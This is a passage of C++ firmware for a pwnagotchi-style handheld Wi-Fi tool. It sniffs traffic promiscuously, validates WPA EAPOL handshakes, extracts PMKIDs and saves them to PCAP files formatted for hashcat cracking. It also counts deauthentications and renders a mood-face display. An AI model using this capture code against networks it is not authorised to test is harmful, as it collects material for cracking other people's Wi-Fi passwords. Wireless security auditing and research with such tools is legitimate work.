  if (e[1] != 0x03 || e[4] != 0x02) return 0;
  uint16_t ki = ((uint16_t)e[5] << 8) | e[6];
  bool ack = (ki & 0x0080), mic = (ki & 0x0100), secure = (ki & 0x0200);
  int msg = 0;
  if (ack && !mic) msg = 1; else if (ack && mic) msg = 3;
  else if (!ack && mic) msg = secure ? 4 : 2;  // Secure bit splits M4 from M2 (matches oink)
  if (msg == 0 || msg == 4) return msg;
  if (entry.validated) return msg;
  // Pair M1 ANonce + M2 SNonce by STA MAC. Validation is independent of storage
  // and of whether a beacon was seen — the nonces in the frames are enough.
  if (msg == 1 || msg == 3) {
    memcpy(entry.anonce, e + 17, 32); memcpy(entry.staMacM1, data + 4, 6); entry.hasAnonce = true;
    if (entry.hasM2Data && !memcmp(entry.staMacM1, entry.staMacM2, 6)) entry.validated = true;
  } else if (msg == 2) {
    memcpy(entry.m2Snonce, e + 17, 32); memcpy(entry.staMacM2, data + 10, 6); entry.hasM2Data = true;
    if (entry.hasAnonce && !memcmp(entry.staMacM1, entry.staMacM2, 6)) entry.validated = true;
  }
  return msg;
}

int WifiUnigotchiScreen::_registerApTarget(const MacAddr& bssid, uint8_t ch, int8_t rssi) {
  for (int i = 0; i < _apCount; i++) {
    if (!memcmp(_apTargets[i].bssid, bssid.data(), 6)) {
      _apTargets[i].channel = ch;
      if (rssi != 0) _apTargets[i].rssi = rssi;
      return i;
    }
  }
  if (_apCount < MAX_TARGETS) {
    ApTarget& t = _apTargets[_apCount];
    memcpy(t.bssid, bssid.data(), 6); t.channel = ch; t.rssi = rssi;
    t.clientCount = 0; t.lastClientMs = 0; t.attempted = false; t.pmkidProbed = false;
    return _apCount++;
  }
  return -1;
}

void WifiUnigotchiScreen::_addClient(const uint8_t* bssid, const uint8_t* sta, uint8_t ch, int8_t rssi) {
  MacAddr mac; memcpy(mac.data(), bssid, 6);
  int idx = _registerApTarget(mac, ch, rssi);
  if (idx < 0) return;
  ApTarget& t = _apTargets[idx];
  for (uint8_t c = 0; c < t.clientCount; c++)
    if (!memcmp(t.clients[c], sta, 6)) { t.lastClientMs = millis(); return; }
  if (t.clientCount < MAX_CLIENTS) {
    memcpy(t.clients[t.clientCount++], sta, 6);
    t.lastClientMs = millis();
  }
}

void WifiUnigotchiScreen::_onHandshake(const std::string& ssid) {
  _handshakes++;
  int nh = Achievement.inc("wifi_eapol_handshake_valid");
  if (nh == 1)  Achievement.unlock("wifi_eapol_handshake_valid");
  if (nh == 5)  Achievement.unlock("wifi_eapol_handshake_5");
  if (nh == 20) Achievement.unlock("wifi_eapol_handshake_20");
  if (nh == 50) Achievement.unlock("wifi_eapol_handshake_50");
  if (Uni.Speaker) Uni.Speaker->playNotification();   // standard capture chime
  _say(MoodFace::EXCITED, TFT_MAGENTA, MoodMsg::newHandshake(1));
  _dirty |= D_STATS;
}

void WifiUnigotchiScreen::_flush() {
  while (_cTail != _cHead) {
    const ClientSight& cs = _cring[_cTail];
    _cTail = (_cTail + 1) % CRING;
    _addClient(cs.bssid, cs.sta, cs.channel, cs.rssi);
  }

  while (_ringTail != _ringHead) {
    const RawCapture& cap = _ring[_ringTail];
    _ringTail = (_ringTail + 1) % RING_SIZE;

    if (cap.isBeacon) {
      if (_ssidMap.find(cap.bssid) == _ssidMap.end() && cap.len >= 38) {
        uint16_t pos = 36;
        while (pos + 2 <= cap.len) {
          uint8_t id = cap.data[pos], elen = cap.data[pos + 1];
          if (pos + 2 + elen > cap.len) break;
          if (id == 0 && elen > 0 && elen <= 32) {
            _ssidMap.emplace(cap.bssid, std::string(reinterpret_cast<const char*>(cap.data + pos + 2), elen));
            break;
          }
          pos += 2 + elen;
        }
      }
      _registerApTarget(cap.bssid, cap.channel, cap.rssi);

      // Keep the first beacon so a later-created capture file can include it (the
      // beacon carries the ESSID hashcat likes). Bounded so it can't grow forever.
      if (_beaconStore.find(cap.bssid) == _beaconStore.end() && _beaconStore.size() < 64)
        _beaconStore.emplace(cap.bssid, std::vector<uint8_t>(cap.data, cap.data + cap.len));

      // If a capture file is already open for this AP without a beacon, add it now.
      auto eIt = _eapolMap.find(cap.bssid);
      if (eIt != _eapolMap.end() && !eIt->second.validated && _storageOk &&
          !eIt->second.filepath.empty() && !eIt->second.beaconWritten) {
        _appendPcapFrame(eIt->second.filepath, cap.data, cap.len);
        eIt->second.beaconWritten = true;
        if (eIt->second.ssid.empty()) {
          auto s = _ssidMap.find(cap.bssid);
          if (s != _ssidMap.end()) eIt->second.ssid = s->second;
        }
      }
      continue;
    }

    // ── EAPOL frame ──────────────────────────────────────────────────────────
    auto& entry = _eapolMap[cap.bssid];
    if (entry.validated) continue;
    auto ssidIt = _ssidMap.find(cap.bssid);
    if (ssidIt != _ssidMap.end() && entry.ssid.empty()) entry.ssid = ssidIt->second;

    if (_parseEapolMsg(cap.data, cap.len) == 1 && !entry.pmkidSeen &&
        _extractPmkid(cap.data, cap.len)) {
      entry.pmkidSeen = true; _pmkids++;
      if (Uni.Speaker) Uni.Speaker->beep();
      _say(MoodFace::EXCITED, TFT_ORANGE, "Got a PMKID!");
      _dirty |= D_STATS;
    }

    // Persist to PCAP if storage is available. The file is created on the first
    // EAPOL frame even when the SSID is unknown (named by BSSID), so we never
    // drop a handshake just because the beacon hasn't been seen yet.
    if (_storageOk) {
      if (entry.filepath.empty()) {
        entry.filepath = _makePath(cap.bssid, entry.ssid);
        _writePcapHeader(entry.filepath);
        auto bcnIt = _beaconStore.find(cap.bssid);
        if (bcnIt != _beaconStore.end()) {
          _appendPcapFrame(entry.filepath, bcnIt->second.data(), (uint16_t)bcnIt->second.size());
          entry.beaconWritten = true;
        }
      }
      if (!entry.filepath.empty()) _appendPcapFrame(entry.filepath, cap.data, cap.len);
    }

    // Validate from the frame contents — works even with no SD card.
    bool wasValid = entry.validated;
    _updateValidation(entry, cap.data, cap.len);
    if (!wasValid && entry.validated) { _onHandshake(entry.ssid); _beaconStore.erase(cap.bssid); }
  }
}

// ── Promiscuous callback ────────────────────────────────────────────────────────

void WifiUnigotchiScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (buf == nullptr) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const auto pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  const uint16_t fc = (uint16_t)pay[0] | ((uint16_t)pay[1] << 8);
  const uint8_t fcType = (fc & 0x000C) >> 2;
  const uint8_t fcSub  = (fc & 0x00F0) >> 4;

  if (fcType == 0 && fcSub == 8 && len >= 36) {  // beacon
    int next = (_ringHead + 1) % RING_SIZE; if (next == _ringTail) return;
    RawCapture& s = _ring[_ringHead];
    memcpy(s.bssid.data(), pay + 16, 6);
    uint16_t cl = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(s.data, pay, cl);
    s.len = cl; s.channel = pkt->rx_ctrl.channel; s.rssi = pkt->rx_ctrl.rssi; s.isBeacon = true;
    _ringHead = next; return;
  }

  if (fcType != 2) return;  // data only

  const uint8_t toDs = pay[1] & 0x01, fromDs = (pay[1] & 0x02) >> 1;
  uint8_t bssid[6], sta[6]; bool haveSta = false;
  if (toDs && !fromDs)      { memcpy(bssid, pay + 4, 6);  memcpy(sta, pay + 10, 6); haveSta = true; }
  else if (!toDs && fromDs) { memcpy(bssid, pay + 10, 6); memcpy(sta, pay + 4, 6);  haveSta = true; }
  else                      { memcpy(bssid, pay + 16, 6); }

  if (haveSta && !(sta[0] & 0x01)) {
    bool zero = true; for (int i = 0; i < 6; i++) if (sta[i]) { zero = false; break; }
    if (!zero) {
      int nx = (_cHead + 1) % CRING;
      if (nx != _cTail) {
        ClientSight& c = _cring[_cHead];
        memcpy(c.bssid, bssid, 6); memcpy(c.sta, sta, 6);
        c.channel = pkt->rx_ctrl.channel; c.rssi = pkt->rx_ctrl.rssi;
        _cHead = nx;
      }
    }
  }

  const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 10 <= len; i++) {   // need SNAP(8)+ver(1)+type(1); avoids OOB read of pay[i+9]
    bool m = true; for (int k = 0; k < 8; k++) if (pay[i + k] != snap[k]) { m = false; break; }
    if (!m) continue;
    if (pay[i + 9] != 0x03) return;
    int next = (_ringHead + 1) % RING_SIZE; if (next == _ringTail) return;
    RawCapture& s = _ring[_ringHead];
    memcpy(s.bssid.data(), bssid, 6);
    uint16_t cl = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(s.data, pay, cl);
    s.len = cl; s.channel = pkt->rx_ctrl.channel; s.rssi = pkt->rx_ctrl.rssi; s.isBeacon = false;
    _ringHead = next; return;
  }
}

// ── UI (pwnagotchi-style: SVG face bitmap + plain text) ───────────────────────

// Off-white ink for all Unigotchi content — rgb(223,223,223) in RGB565.
static const uint16_t UG_INK = 0xDEFB;

void WifiUnigotchiScreen::_say(MoodFace::Mood mood, uint16_t faceColor, const String& phrase) {
  (void)faceColor;   // pwnagotchi look: everything is white
  _faceMood = mood; _faceVariant = (uint8_t)random(8);
  strncpy(_curMsg, phrase.c_str(), sizeof(_curMsg) - 1);
  _curMsg[sizeof(_curMsg) - 1] = '\0';
  _lastMoodMs = millis();
  _pushLog(phrase);
  _dirty |= D_BODY;
}

// Append a line to the rolling log; drop the oldest when full. Only the text
// display style renders it, but we keep it fed in both styles so a mid-session
// switch shows recent history.
void WifiUnigotchiScreen::_pushLog(const String& line) {
  if (_logCount < LOG_LINES) {
    _log[_logCount++] = line;
  } else {
    for (int i = 1; i < LOG_LINES; i++) _log[i - 1] = _log[i];
    _log[LOG_LINES - 1] = line;
  }
}

// Pwnagotchi-flavoured status line built from the live counters.
String WifiUnigotchiScreen::_statusSentence() {
  unsigned long mins = (millis() - _sessionStart) / 60000UL;
  char b[96];
  snprintf(b, sizeof(b), "Pwning for %lum, kicked %lu, ate %lu HS & %lu PMKID",
           mins, (unsigned long)_deauths, (unsigned long)_handshakes, (unsigned long)_pmkids);
  return String(b);
}

// Draw a 1-bit bitmap (byte-aligned rows, MSB first), each set bit scaled.
template <typename T>
static void _drawBits(T& lcd, const uint8_t* bmp, int w, int h, int x, int y, int scale, uint16_t color) {
  const int bw = (w + 7) / 8;
  for (int row = 0; row < h; row++) {
    const uint8_t* r = bmp + row * bw;
    for (int col = 0; col < w; col++) {
      if (r[col >> 3] & (0x80 >> (col & 7))) {
        if (scale == 1) lcd.drawPixel(x + col, y + row, color);
        else            lcd.fillRect(x + col * scale, y + row * scale, scale, scale, color);
      }
    }
  }
}

static const MoodArtFace* _pickFace(MoodFace::Mood mood, uint8_t variant) {
  const MoodArtFace* arr; uint8_t n;
  switch (mood) {
    case MoodFace::SLEEPING: arr = MOODART_sleeping; n = MOODART_sleeping_count; break;
    case MoodFace::HAPPY:    arr = MOODART_happy;    n = MOODART_happy_count;    break;
    case MoodFace::SAD:      arr = MOODART_sad;      n = MOODART_sad_count;      break;
    case MoodFace::EXCITED:  arr = MOODART_excited;  n = MOODART_excited_count;  break;
    case MoodFace::LOOKING:
    default:                 arr = MOODART_looking;  n = MOODART_looking_count;  break;
  }
  return &arr[variant % n];
}

void WifiUnigotchiScreen::onRender() {
  auto& lcd = Uni.Lcd;
  const int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();
  const int ts    = bw < 320 ? 1 : 2;
  const int lineH = ts * 9;

  const int topH  = lineH + 4;         // single status line + separator
  const int statH = lineH + 4;         // separator + bottom counters
  const int by0   = by + topH;
  const int bh0   = bh - topH - statH;
  const int statY = by + bh - statH;

  if (_firstRender) { lcd.fillRect(bx, by, bw, bh, TFT_BLACK); _firstRender = false; _dirty = D_ALL; }

  if (_dirty & D_TOP)   { _drawTop(bx, by, bw);        _dirty &= ~D_TOP; }
  if (_dirty & D_BODY)  {
    if (_style == STYLE_TEXT) _drawBodyText(bx, by0, bw, bh0);
    else                      _drawBody(bx, by0, bw, bh0);
    _dirty &= ~D_BODY;
  }
  if (_dirty & D_STATS) { _drawStats(bx, statY, bw);   _dirty &= ~D_STATS; }
}

// Top: AP / CH (left) + UP (right), then a separator line. Plain white.
void WifiUnigotchiScreen::_drawTop(int bx, int by, int bw) {
  auto& lcd = Uni.Lcd;
  const int ts = bw < 320 ? 1 : 2, lineH = ts * 9;
  lcd.fillRect(bx, by, bw, lineH + 4, TFT_BLACK);
  lcd.setTextSize(ts);
  lcd.setTextColor(UG_INK, TFT_BLACK);
  char l[24]; snprintf(l, sizeof(l), "AP %d  CH %d", _apCount, _channel);
  lcd.setTextDatum(TL_DATUM); lcd.drawString(l, bx, by);
  unsigned long up = (millis() - _sessionStart) / 1000UL;
  char r[16]; snprintf(r, sizeof(r), "UP %lu:%02lu", up / 60, up % 60);
  lcd.setTextDatum(TR_DATUM); lcd.drawString(r, bx + bw, by);
  lcd.drawFastHLine(bx, by + lineH + 2, bw, UG_INK);
}

// Centred block: "Unigotchi> Lvl N" (bigger) + left-aligned face + message.
// Everything white (pwnagotchi look).
void WifiUnigotchiScreen::_drawBody(int bx, int by, int bw, int h) {
  auto& lcd = Uni.Lcd;
  const int ts = bw < 320 ? 1 : 2, lineH = ts * 9;
  const int hts = ts + 1, hLineH = hts * 9;   // header a bit bigger
  const int gap = 4;

  lcd.fillRect(bx, by, bw, h, TFT_BLACK);

  const char* hdr = "Unigotchi>";

  // face (left-aligned), scaled to fit
  const MoodArtFace* f = _pickFace(_faceMood, _faceVariant);
  int scale = 1;
  int faceMaxH = h - hLineH - gap * 2 - lineH;
  while ((f->h * (scale + 1)) <= faceMaxH && (f->w * (scale + 1)) <= bw && scale < 4) scale++;
  int fh = f->h * scale;

  // wrap "> message" and count lines
  String s = String("> ") + _curMsg;
  String lines[4]; int nLines = 0;
  lcd.setTextSize(ts);
  for (int start = 0, n = s.length(); start < n && nLines < 4; ) {
    int cut = n, lastSpace = -1;
    for (int i = start; i < n; i++) {
      if (lcd.textWidth(s.substring(start, i + 1).c_str()) > bw) { cut = (lastSpace > start) ? lastSpace : i; break; }
      if (s[i] == ' ') lastSpace = i;
    }
    lines[nLines++] = s.substring(start, cut);
    start = (cut < n && s[cut] == ' ') ? cut + 1 : cut;
  }
  int msgH = nLines * lineH;

  // vertically centre the whole block
  int blockH = hLineH + gap + fh + gap + msgH;
  int y = by + (h - blockH) / 2; if (y < by) y = by;

  lcd.setTextSize(hts); lcd.setTextDatum(TL_DATUM); lcd.setTextColor(UG_INK, TFT_BLACK);
  lcd.drawString(hdr, bx, y);
  y += hLineH + gap;

  _drawBits(lcd, f->bits, f->w, f->h, bx, y, scale, UG_INK);
  y += fh + gap;

  lcd.setTextSize(ts); lcd.setTextColor(UG_INK, TFT_BLACK);
  for (int i = 0; i < nLines; i++) lcd.drawString(lines[i].c_str(), bx, y + i * lineH);
}

// Text display style: a scrolling terminal-like log of engine events, filling
// the same centre body the face would occupy. The top status line and the
// bottom counters are already plain text and shared with the gotchi style.
void WifiUnigotchiScreen::_drawBodyText(int bx, int by, int bw, int h) {
  auto& lcd = Uni.Lcd;
  const int ts = bw < 320 ? 1 : 2, lineH = ts * 9;
  lcd.fillRect(bx, by, bw, h, TFT_BLACK);
  lcd.setTextSize(ts);
  lcd.setTextColor(UG_INK, TFT_BLACK);
  lcd.setTextDatum(TL_DATUM);

  int maxLines = h / lineH;
  if (maxLines < 1) maxLines = 1;
  const int show  = (_logCount < maxLines) ? _logCount : maxLines;
  const int first = _logCount - show;   // newest `show` lines, oldest drawn first

  int y = by;
  for (int i = 0; i < show; i++) {
    String ln = _log[first + i];
    // clip to the body width so a long phrase can't overrun into the margin
    while (ln.length() && lcd.textWidth(ln.c_str()) > bw) ln.remove(ln.length() - 1);
    lcd.drawString(ln.c_str(), bx, y);
    y += lineH;
  }
}

// Bottom: counters (left) + mode (right). Plain white.
void WifiUnigotchiScreen::_drawStats(int bx, int by, int bw) {
  auto& lcd = Uni.Lcd;
  const int ts = bw < 320 ? 1 : 2, lineH = ts * 9;
  lcd.fillRect(bx, by, bw, lineH + 4, TFT_BLACK);
  lcd.drawFastHLine(bx, by, bw, UG_INK);        // separator above the counters
  const int ty = by + 4;
  lcd.setTextSize(ts);
  lcd.setTextColor(UG_INK, TFT_BLACK);
  char b[40];
  if (_mode == MODE_PWNGRID)
    snprintf(b, sizeof(b), "FRIENDS %u  TX %lu", _friendsTot, (unsigned long)_pwngridTx);
  else if (_mode == MODE_PWNSPAM)
    snprintf(b, sizeof(b), "SPAM TX %lu", (unsigned long)_pwngridTx);
  else
    snprintf(b, sizeof(b), "HS %lu PM %lu DE %lu", (unsigned long)_handshakes,
             (unsigned long)_pmkids, (unsigned long)_deauths);
  lcd.setTextDatum(TL_DATUM); lcd.drawString(b, bx, ty);
  const char* nm = _mode == MODE_ACTIVE  ? "ACTIVE"
                 : _mode == MODE_PWNGRID ? "PWNGRID"
                 : _mode == MODE_PWNSPAM ? "SPAM" : "PASSIVE";
  lcd.setTextDatum(TR_DATUM); lcd.drawString(nm, bx + bw, ty);
}
